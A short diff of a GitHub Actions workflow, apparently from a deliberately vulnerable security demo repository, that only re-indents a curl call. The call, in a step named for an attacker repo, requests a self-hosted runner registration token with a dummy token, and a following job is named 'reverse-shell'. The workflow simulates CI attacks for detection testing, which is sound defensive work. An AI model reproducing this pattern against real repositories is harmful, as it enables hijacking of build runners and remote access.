@@ -29,8 +29,8 @@ jobs:
       - name: Generate a registration token for attacker repo
         run: |
           response=$(curl -X POST -H "Authorization: token github_pat_dummy_token" \
-            -H "Accept: application/vnd.github.v3+json" \
-            https://api.github.com/repos/step-security-experiments/github-actions-goat/actions/runners/registration-token)
+          -H "Accept: application/vnd.github.v3+json" \
+          https://api.github.com/repos/step-security-experiments/github-actions-goat/actions/runners/registration-token)
 
   reverse-shell:
     if: ${{ github.event.inputs.run_only_anomalous != 'true' }}
